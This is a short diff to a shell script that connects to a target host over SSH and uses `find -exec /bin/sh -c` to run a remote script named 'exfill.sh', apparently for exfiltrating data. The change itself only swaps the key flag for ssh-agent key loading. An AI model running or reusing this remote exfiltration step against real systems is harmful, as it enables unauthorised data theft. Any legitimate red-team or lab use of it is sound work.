@@ -32,6 +32,13 @@ if [ "${#missing[@]}" -gt 0 ]; then
   exit 1
 fi
 
-ssh -i $LOCAL_SSH_KEY $TARGET_HOST_SSH_USER@$TARGET_HOST "/usr/bin/find . -exec /bin/sh -c $TARGET_HOST_ROOTDIR/scripts/exfill.sh \; -quit"
+# Ensure an SSH agent is running
+if ! ssh-add -l >/dev/null 2>&1; then
+  eval "$(ssh-agent -s)" >/dev/null
+fi
+# Load SSH key
+ssh-add $LOCAL_SSH_KEY >/dev/null 2>&1
+
+ssh $TARGET_HOST_SSH_USER@$TARGET_HOST "/usr/bin/find . -exec /bin/sh -c $TARGET_HOST_ROOTDIR/scripts/exfill.sh \; -quit"
 
 ping $TARGET_HOST
